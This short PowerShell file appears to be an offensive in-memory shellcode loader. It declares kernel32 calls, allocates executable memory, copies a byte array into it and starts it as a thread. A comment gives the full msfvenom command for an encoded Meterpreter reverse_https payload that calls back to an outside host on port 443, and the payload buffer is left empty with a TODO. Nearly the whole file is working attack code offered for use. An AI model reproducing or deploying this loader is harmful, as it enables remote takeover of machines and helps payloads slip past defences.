$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32
{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Auto)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $Kernel32

# Create Shellcode & Copy Into Memory
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 EXITFUNC=thread -e x64/xor_dynamic -f powershell
# TODO: replace this
[Byte[]] $buf =

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $Size)
$thandle = [Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
